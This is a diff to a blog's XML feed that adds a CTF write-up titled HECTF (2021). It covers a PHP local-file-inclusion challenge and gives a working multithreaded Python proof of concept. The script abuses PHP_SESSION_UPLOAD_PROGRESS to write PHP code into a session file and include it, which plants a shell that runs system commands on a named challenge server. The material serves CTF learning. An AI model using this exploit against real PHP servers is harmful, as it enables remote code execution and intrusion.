@@ -4,6 +4,39 @@
   
   
   <entry>
+    <title>HECTF</title>
+    <link href="/2021/11/16/HECTF/"/>
+    <url>/2021/11/16/HECTF/</url>
+    
+    <content type="html"><![CDATA[<h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>题目：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    show_source(<span class="hljs-string">&#x27;./index.php&#x27;</span>);    <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-meta">?&gt;</span></code></pre><p>session文件包含，写入shell到session文件</p><p>poc</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, waittarget = <span class="hljs-string">&#x27;http://81.70.102.209:10040/index.php&#x27;</span>session = requests.session()flag = <span class="hljs-string">&#x27;aaaa&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>(<span class="hljs-params">e: threading.Event</span>):</span>    files = [        (<span class="hljs-string">&#x27;value&#x27;</span>, (<span class="hljs-string">&#x27;load.png&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40960</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>)),    ]    data = &#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">rf&#x27;&#x27;&#x27;&lt;?php file_put_contents(&#x27;/tmp/success&#x27;, &#x27;&lt;?=system(&quot;cat /f1aggggggggggggggggggggggg&quot;);?&gt;&#x27;); echo(&#x27;<span class="hljs-subst">&#123;flag&#125;</span>&#x27;); ?&gt;&#x27;&#x27;&#x27;</span>&#125;    <span class="hljs-comment">#data = &#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: rf&#x27;&#x27;&#x27;&lt;?php file_put_contents(&#x27;/tmp/success&#x27;, &#x27;&lt;?=system(&quot;ls /&quot;);?&gt;&#x27;); ?&gt;&#x27;&#x27;&#x27;&#125;</span>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.is_set():        requests.post(            target,            data=data,            files=files,            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: flag&#125;,        )<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">e: threading.Event</span>):</span>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.is_set():        response = requests.get(            <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;target&#125;</span>?file=/tmp/sess_<span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span>,        )        <span class="hljs-keyword">if</span> flag.encode() <span class="hljs-keyword">in</span> response.content:            e.<span class="hljs-built_in">set</span>()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    futures = []    event = threading.Event()    pool = ThreadPoolExecutor(<span class="hljs-number">15</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):        futures.append(pool.submit(upload, event))    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):        futures.append(pool.submit(write, event))    wait(futures)</code></pre><p>访问<code>http://81.70.102.209:10040/?file=/tmp/success</code>得到flag</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>php</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>WP</tag>
+      
+      <tag>php</tag>
+      
+      <tag>session文件包含写shell</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Hackergame2021</title>
     <link href="/2021/11/07/hackergame2021/"/>
     <url>/2021/11/07/hackergame2021/</url>
